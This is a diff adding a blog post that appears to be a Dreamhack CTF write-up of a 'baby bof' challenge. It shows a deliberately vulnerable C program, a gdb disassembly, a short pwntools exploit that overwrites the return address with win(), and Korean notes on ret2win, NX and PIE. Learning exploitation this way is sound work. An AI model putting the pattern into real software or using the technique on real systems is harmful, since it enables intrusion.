@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ctf baby bof · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2; margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag { background: var(--tag); border-radius: 4px; padding: .1rem .5rem; font-size: .72rem; color: var(--muted); }
+    .post-body { line-height: 1.85; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.4rem; font-weight: 400; margin: 2.2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.8rem 0 .5rem; }
+    .post-body h4 { font-size: .9rem; font-weight: 600; margin: 1.2rem 0 .4rem; color: var(--muted); }
+    .post-body p  { margin-bottom: 1rem; }
+    .post-body ul, .post-body ol { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .35rem; }
+    .post-body blockquote {
+      border-left: 3px solid var(--accent); margin: 1.2rem 0;
+      padding: .6rem 1rem; background: var(--tag); border-radius: 0 6px 6px 0;
+    }
+    .post-body blockquote p { margin: 0; color: var(--muted); font-style: italic; }
+    .post-body hr { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0; border-radius: 6px;
+      padding: 1.2rem; overflow-x: auto; font-size: .82rem; margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code { background: var(--tag); border-radius: 3px; padding: .1rem .35rem; font-size: .85em; }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem; transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../../pages/papers.html">Papers</a></li>
+    <li><a href="../../pages/posts.html" class="active">Posts</a></li>
+    <li><a href="../../pages/blog.html">Blog</a></li>
+    <li><a href="../../pages/cv.html">CV</a></li>
+  </ul>
+</nav>
+<main class="page">
+  <a class="back-link" href="../posts.html">← Back to Posts</a>
+  <div class="post-header">
+    <h1>ctf baby bof</h1>
+    <div class="post-meta">
+      <span>2026·04</span>
+      <span class="post-tag">CTF</span>
+    </div>
+  </div>
+  <hr class="post-divider">
+  <div class="post-body">
+<h2>문제</h2>
+
+<h2><strong>Description</strong></h2>
+
+<p><strong>Simple pwnable 101 challenge</strong></p>
+
+<p><strong>Q. What is Return Address?</strong></p>
+
+<p><strong>Q. Explain that why BOF is dangerous.</strong></p>
+
+<pre><code class="language-c">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0423/deploy]
+└─$ cat baby-bof.c
+// gcc -o baby-bof baby-bof.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;time.h&gt;
+
+void proc_init ()
+{
+  setvbuf (stdin, 0, 2, 0); setvbuf (stdout, 0, 2, 0);
+  setvbuf (stderr, 0, 2, 0);
+}
+
+void win ()
+{
+  char flag[100] = {0,};
+  int fd;
+  puts ("You mustn't be here! It's a vulnerability!");
+
+  fd = open ("./flag", O_RDONLY);
+  read(fd, flag, 0x60);
+  puts(flag);
+  exit(0);
+}
+
+long count;
+long value;
+long idx = 0;
+int main ()
+{
+  char name[16];
+
+  // don't care this init function
+  proc_init ();
+  printf ("the main function doesn't call win function (0x%lx)!\n", win);
+
+  printf ("name: ");
+  scanf ("%15s", name);
+
+  printf ("GM GA GE GV %s!!\n: ", name);
+
+  printf ("|  addr\t\t|  value\t\t|\n");
+  for (idx = 0; idx &lt; 0x10; idx++) {
+    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
+  }
+
+  printf ("hex value: ");
+  scanf ("%lx%c", &amp;value);
+
+  printf ("integer count: ");
+  scanf ("%d%c", &amp;count);
+
+  for (idx = 0; idx &lt; count; idx++) {
+    *(long*)(name+idx*8) = value;
+  }
+
+  printf ("|  addr\t\t|  value\t\t|\n");
+  for (idx = 0; idx &lt; 0x10; idx++) {
+    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
+  }
+
+  return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-c">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x0000000000401325 &lt;+0&gt;:     endbr64
+   0x0000000000401329 &lt;+4&gt;:     push   rbp
+   0x000000000040132a &lt;+5&gt;:     mov    rbp,rsp
+   0x000000000040132d &lt;+8&gt;:     sub    rsp,0x10
+   0x0000000000401331 &lt;+12&gt;:    mov    eax,0x0
+   0x0000000000401336 &lt;+17&gt;:    call   0x4011f6 &lt;proc_init&gt;
+   0x000000000040133b &lt;+22&gt;:    lea    rax,[rip+0xffffffffffffff19]        # 0x40125b &lt;win&gt;
+   0x0000000000401342 &lt;+29&gt;:    mov    rsi,rax
+   0x0000000000401345 &lt;+32&gt;:    lea    rax,[rip+0xcf4]        # 0x402040
+   0x000000000040134c &lt;+39&gt;:    mov    rdi,rax
+   0x000000000040134f &lt;+42&gt;:    mov    eax,0x0
+   0x0000000000401354 &lt;+47&gt;:    call   0x4010b0 &lt;printf@plt&gt;
+   0x0000000000401359 &lt;+52&gt;:    lea    rax,[rip+0xd16]        # 0x402076
+   0x0000000000401360 &lt;+59&gt;:    mov    rdi,rax
+   0x0000000000401363 &lt;+62&gt;:    mov    eax,0x0
+   0x0000000000401368 &lt;+67&gt;:    call   0x4010b0 &lt;printf@plt&gt;
+   0x000000000040136d &lt;+72&gt;:    lea    rax,[rbp-0x10]
+   0x0000000000401371 &lt;+76&gt;:    mov    rsi,rax
+   0x0000000000401374 &lt;+79&gt;:    lea    rax,[rip+0xd02]        # 0x40207d
+   0x000000000040137b &lt;+86&gt;:    mov    rdi,rax
+   0x000000000040137e &lt;+89&gt;:    mov    eax,0x0
+   0x0000000000401383 &lt;+94&gt;:    call   0x4010f0 &lt;__isoc99_scanf@plt&gt;
+   0x0000000000401388 &lt;+99&gt;:    lea    rax,[rbp-0x10]
+   0x000000000040138c &lt;+103&gt;:   mov    rsi,rax
+   0x000000000040138f &lt;+106&gt;:   lea    rax,[rip+0xcec]        # 0x402082
+   0x0000000000401396 &lt;+113&gt;:   mov    rdi,rax
+   0x0000000000401399 &lt;+116&gt;:   mov    eax,0x0
+   0x000000000040139e &lt;+121&gt;:   call   0x4010b0 &lt;printf@plt&gt;
+   0x00000000004013a3 &lt;+126&gt;:   lea    rax,[rip+0xcec]        # 0x402096
+   0x00000000004013aa &lt;+133&gt;:   mov    rdi,rax
+   0x00000000004013ad &lt;+136&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x00000000004013b2 &lt;+141&gt;:   mov    QWORD PTR [rip+0x2ce3],0x0        # 0x4040a0 &lt;idx&gt;
+   0x00000000004013bd &lt;+152&gt;:   jmp    0x401418 &lt;main+243&gt;
+   0x00000000004013bf &lt;+154&gt;:   mov    rax,QWORD PTR [rip+0x2cda]        # 0x4040a0 &lt;idx&gt;
+   0x00000000004013c6 &lt;+161&gt;:   shl    rax,0x3
+   0x00000000004013ca &lt;+165&gt;:   mov    rdx,rax
+   0x00000000004013cd &lt;+168&gt;:   lea    rax,[rbp-0x10]
+   0x00000000004013d1 &lt;+172&gt;:   add    rax,rdx
+   0x00000000004013d4 &lt;+175&gt;:   mov    rax,QWORD PTR [rax]
+   0x00000000004013d7 &lt;+178&gt;:   mov    rdx,QWORD PTR [rip+0x2cc2]        # 0x4040a0 &lt;idx&gt;
+   0x00000000004013de &lt;+185&gt;:   shl    rdx,0x3
+   0x00000000004013e2 &lt;+189&gt;:   mov    rcx,rdx
+   0x00000000004013e5 &lt;+192&gt;:   lea    rdx,[rbp-0x10]
+   0x00000000004013e9 &lt;+196&gt;:   add    rcx,rdx
+   0x00000000004013ec &lt;+199&gt;:   mov    rdx,rax
+   0x00000000004013ef &lt;+202&gt;:   mov    rsi,rcx
+   0x00000000004013f2 &lt;+205&gt;:   lea    rax,[rip+0xcb2]        # 0x4020ab
+   0x00000000004013f9 &lt;+212&gt;:   mov    rdi,rax
+   0x00000000004013fc &lt;+215&gt;:   mov    eax,0x0
+   0x0000000000401401 &lt;+220&gt;:   call   0x4010b0 &lt;printf@plt&gt;
+   0x0000000000401406 &lt;+225&gt;:   mov    rax,QWORD PTR [rip+0x2c93]        # 0x4040a0 &lt;idx&gt;
+   0x000000000040140d &lt;+232&gt;:   add    rax,0x1
+   0x0000000000401411 &lt;+236&gt;:   mov    QWORD PTR [rip+0x2c88],rax        # 0x4040a0 &lt;idx&gt;
+   0x0000000000401418 &lt;+243&gt;:   mov    rax,QWORD PTR [rip+0x2c81]        # 0x4040a0 &lt;idx&gt;
+   0x000000000040141f &lt;+250&gt;:   cmp    rax,0xf
+   0x0000000000401423 &lt;+254&gt;:   jle    0x4013bf &lt;main+154&gt;
+   0x0000000000401425 &lt;+256&gt;:   lea    rax,[rip+0xc92]        # 0x4020be
+   0x000000000040142c &lt;+263&gt;:   mov    rdi,rax
+   0x000000000040142f &lt;+266&gt;:   mov    eax,0x0
+   0x0000000000401434 &lt;+271&gt;:   call   0x4010b0 &lt;printf@plt&gt;
+   0x0000000000401439 &lt;+276&gt;:   lea    rax,[rip+0x2c58]        # 0x404098 &lt;value&gt;
+   0x0000000000401440 &lt;+283&gt;:   mov    rsi,rax
+   0x0000000000401443 &lt;+286&gt;:   lea    rax,[rip+0xc80]        # 0x4020ca
+   0x000000000040144a &lt;+293&gt;:   mov    rdi,rax
+   0x000000000040144d &lt;+296&gt;:   mov    eax,0x0
+   0x0000000000401452 &lt;+301&gt;:   call   0x4010f0 &lt;__isoc99_scanf@plt&gt;
+   0x0000000000401457 &lt;+306&gt;:   lea    rax,[rip+0xc72]        # 0x4020d0
+   0x000000000040145e &lt;+313&gt;:   mov    rdi,rax
+   0x0000000000401461 &lt;+316&gt;:   mov    eax,0x0
+   0x0000000000401466 &lt;+321&gt;:   call   0x4010b0 &lt;printf@plt&gt;
+   0x000000000040146b &lt;+326&gt;:   lea    rax,[rip+0x2c1e]        # 0x404090 &lt;count&gt;
+   0x0000000000401472 &lt;+333&gt;:   mov    rsi,rax
+   0x0000000000401475 &lt;+336&gt;:   lea    rax,[rip+0xc64]        # 0x4020e0
+   0x000000000040147c &lt;+343&gt;:   mov    rdi,rax
+   0x000000000040147f &lt;+346&gt;:   mov    eax,0x0
+   0x0000000000401484 &lt;+351&gt;:   call   0x4010f0 &lt;__isoc99_scanf@plt&gt;
+   0x0000000000401489 &lt;+356&gt;:   mov    QWORD PTR [rip+0x2c0c],0x0        # 0x4040a0 &lt;idx&gt;
+   0x0000000000401494 &lt;+367&gt;:   jmp    0x4014c7 &lt;main+418&gt;
+   0x0000000000401496 &lt;+369&gt;:   mov    rax,QWORD PTR [rip+0x2c03]        # 0x4040a0 &lt;idx&gt;
+   0x000000000040149d &lt;+376&gt;:   shl    rax,0x3
+   0x00000000004014a1 &lt;+380&gt;:   mov    rdx,rax
+   0x00000000004014a4 &lt;+383&gt;:   lea    rax,[rbp-0x10]
+   0x00000000004014a8 &lt;+387&gt;:   add    rdx,rax
+   0x00000000004014ab &lt;+390&gt;:   mov    rax,QWORD PTR [rip+0x2be6]        # 0x404098 &lt;value&gt;
+   0x00000000004014b2 &lt;+397&gt;:   mov    QWORD PTR [rdx],rax
+   0x00000000004014b5 &lt;+400&gt;:   mov    rax,QWORD PTR [rip+0x2be4]        # 0x4040a0 &lt;idx&gt;
+   0x00000000004014bc &lt;+407&gt;:   add    rax,0x1
+   0x00000000004014c0 &lt;+411&gt;:   mov    QWORD PTR [rip+0x2bd9],rax        # 0x4040a0 &lt;idx&gt;
+   0x00000000004014c7 &lt;+418&gt;:   mov    rdx,QWORD PTR [rip+0x2bd2]        # 0x4040a0 &lt;idx&gt;
+   0x00000000004014ce &lt;+425&gt;:   mov    rax,QWORD PTR [rip+0x2bbb]        # 0x404090 &lt;count&gt;
+   0x00000000004014d5 &lt;+432&gt;:   cmp    rdx,rax
+   0x00000000004014d8 &lt;+435&gt;:   jl     0x401496 &lt;main+369&gt;
+   0x00000000004014da &lt;+437&gt;:   lea    rax,[rip+0xbb5]        # 0x402096
+   0x00000000004014e1 &lt;+444&gt;:   mov    rdi,rax
+   0x00000000004014e4 &lt;+447&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x00000000004014e9 &lt;+452&gt;:   mov    QWORD PTR [rip+0x2bac],0x0        # 0x4040a0 &lt;idx&gt;
+   0x00000000004014f4 &lt;+463&gt;:   jmp    0x40154f &lt;main+554&gt;
+   0x00000000004014f6 &lt;+465&gt;:   mov    rax,QWORD PTR [rip+0x2ba3]        # 0x4040a0 &lt;idx&gt;
+   0x00000000004014fd &lt;+472&gt;:   shl    rax,0x3
+   0x0000000000401501 &lt;+476&gt;:   mov    rdx,rax
+   0x0000000000401504 &lt;+479&gt;:   lea    rax,[rbp-0x10]
+   0x0000000000401508 &lt;+483&gt;:   add    rax,rdx
+   0x000000000040150b &lt;+486&gt;:   mov    rax,QWORD PTR [rax]
+   0x000000000040150e &lt;+489&gt;:   mov    rdx,QWORD PTR [rip+0x2b8b]        # 0x4040a0 &lt;idx&gt;
+   0x0000000000401515 &lt;+496&gt;:   shl    rdx,0x3
+   0x0000000000401519 &lt;+500&gt;:   mov    rcx,rdx
+   0x000000000040151c &lt;+503&gt;:   lea    rdx,[rbp-0x10]
+   0x0000000000401520 &lt;+507&gt;:   add    rcx,rdx
+   0x0000000000401523 &lt;+510&gt;:   mov    rdx,rax
+   0x0000000000401526 &lt;+513&gt;:   mov    rsi,rcx
+   0x0000000000401529 &lt;+516&gt;:   lea    rax,[rip+0xb7b]        # 0x4020ab
+   0x0000000000401530 &lt;+523&gt;:   mov    rdi,rax
+   0x0000000000401533 &lt;+526&gt;:   mov    eax,0x0
+   0x0000000000401538 &lt;+531&gt;:   call   0x4010b0 &lt;printf@plt&gt;
+   0x000000000040153d &lt;+536&gt;:   mov    rax,QWORD PTR [rip+0x2b5c]        # 0x4040a0 &lt;idx&gt;
+   0x0000000000401544 &lt;+543&gt;:   add    rax,0x1
+   0x0000000000401548 &lt;+547&gt;:   mov    QWORD PTR [rip+0x2b51],rax        # 0x4040a0 &lt;idx&gt;
+   0x000000000040154f &lt;+554&gt;:   mov    rax,QWORD PTR [rip+0x2b4a]        # 0x4040a0 &lt;idx&gt;
+   0x0000000000401556 &lt;+561&gt;:   cmp    rax,0xf
+   0x000000000040155a &lt;+565&gt;:   jle    0x4014f6 &lt;main+465&gt;
+   0x000000000040155c &lt;+567&gt;:   mov    eax,0x0
+   0x0000000000401561 &lt;+572&gt;:   leave
+   0x0000000000401562 &lt;+573&gt;:   ret
+End of assembler dump.
+</code></pre>
+
+<pre><code class="language-c">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0423/deploy]
+└─$ !c
+cat ./exploit.py
+from pwn import *
+
+p = remote("host3.dreamhack.games", 17675)
+
+win_addr_str = "401256"
+p.sendlineafter("name: ", "hyeoni")
+p.sendlineafter("hex value: ", win_addr_str)
+p.sendlineafter("integer count: ", "4")
+
+p.interactive()
+</code></pre>
+
+<h3>read 와 scanf 의 차이</h3>
+
+<ul>
+<li><strong><code>read(0, buf, 100)</code></strong>: 사용자가 키보드로 무엇을 치든 <strong>바이트(Raw Bytes)</strong> 그대로 <code>buf</code>에 저장한다. 이때는 <code>p64()</code>를 써야 한다.</li>
+<li><strong><code>scanf("%lx", &val)</code></strong>: <strong><code>p64()</code></strong> 가 아닌 텍스트를 보내야 한다.</li>
+</ul>
+
+<h3>ROP 를 안써도 되는 이유</h3>
+
+<h3>1. 인자(Argument)가 필요 없는 <code>win()</code> 함수</h3>
+
+<p>64비트에서 ROP가 필수적으로 언급되는 이유는 <strong>함수 호출 규약(Calling Convention)</strong> 때문이다.</p>
+
+<ul>
+<li><strong>일반적인 경우:</strong> <code>system("/bin/sh")</code>를 실행하려면 <code>/bin/sh</code> 주소를 <code>RDI</code> 레지스터에 넣어야 합니다. 스택에 있는 값을 레지스터로 옮겨줄 <code>pop rdi; ret</code> 같은 <strong>ROP 가젯</strong>이 꼭 필요</li>
+<li><strong>이 문제의 경우:</strong> 우리가 호출하려는 <code>win()</code> 함수를 보세요. <code>void win()</code> 형태이며 <strong>매개변수가 하나도 없다.</strong></li>
+</ul>
+<p>    - 즉, 레지스터에 따로 값을 세팅해 줄 필요가 없다.</p>
+<p>    - 단순히 리턴 주소(RET)를 <code>win</code> 함수의 시작 주소로 바꾸기만 하면, 컴퓨터는 아무 의심 없이 <code>win</code> 함수로 점프해서 내부 코드를 실행한다.</p>
+
+<hr>
+
+<h3>2. NX 비트와 가젯의 관계</h3>
+
+<ul>
+<li><em>NX(No-Execute)</em>*가 걸려 있으면 스택에 직접 쉘코드를 써서 실행하는 것은 불가능 하지만 이미 코드 영역(<code>.text</code>)에 존재하는 함수인 <code>win()</code>으로 점프하는 것은 NX와 상관없이 가능</li>
+<li><strong>ROP:</strong> 여러 개의 가젯을 엮어서 복잡한 동작(예: <code>execve</code> 호출)을 만드는 기술.</li>
+<li><strong>Ret2Win:</strong> 이미 존재하는 "치트키" 같은 함수(<code>win</code>)로 한 번에 점프하는 기술.</li>
+<li>이 문제에서는 <code>win</code>이라는 치트키가 이미 있으니 굳이 복잡하게 ROP 체인을 구성할 필요가 없는 것</li>
+</ul>
+
+<hr>
+
+<h3>3. PIE(Position Independent Executable)의 부재</h3>
+
+<p>제공해주신 코드 주석을 보면 <code>-no-pie</code> 옵션으로 컴파일되었다고 적혀 있다.</p>
+
+<ul>
+<li><strong>PIE가 있으면:</strong> 함수의 주소가 실행할 때마다 변해서 <code>win</code> 주소를 미리 알 수 없다. 이럴 땐 ROP 등을 통해 주소를 먼저 알아내야(Leak) 한다.</li>
+<li><strong>PIE가 없으면:</strong> <code>win</code> 함수의 주소는 항상 <code>0x401256</code> 등으로 고정된다. 그래서 공격자가 <code>value</code>에 그냥 이 주소를 바로 써넣을 수 있는 것</li>
+</ul>
+  </div>
+</main>
+<script src="../../js/nav.js"></script>
+</body>
+</html>
